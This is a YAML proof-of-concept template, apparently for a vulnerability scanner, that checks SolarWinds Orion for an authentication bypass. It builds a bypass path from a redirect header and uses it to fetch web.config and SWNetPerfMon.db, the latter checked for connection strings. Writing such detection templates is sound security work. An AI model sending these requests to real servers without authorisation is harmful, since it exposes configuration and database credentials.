name: yaml-poc-solarwinds-orion_platform-rce-CT-649559
binding: 3f4f70c0-f231-4460-8bc7-867a24729e9e
detail:
    author: haiqing.chen
    vulnerability:
        id: 969f6a1d-17d3-4eb5-bac0-56545bdf14bb
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /Orion/invalid.aspx.js
        expression: response.raw_header.ibcontains(b"Location") && response.raw_header.ibcontains(b"invalid.aspx")
        output:
            search: '"invalid.aspx.js(?P<location_uri>.*?).L".bsubmatch(response.raw_header)'
            uri: search["location_uri"]
    r1:
        request:
            cache: true
            method: GET
            path: /web.config{{uri}}.L
        expression: response.status == 200 && response.body_string.contains("xml version") && response.body_string.contains("configuration") && response.body_string.contains("system.web")
    r2:
        request:
            cache: true
            method: GET
            path: /SWNetPerfMon.db{{uri}}.L
        expression: response.status == 200 && response.body_string.contains("Connection")
expression: r0() && r1() || r0() && r2()
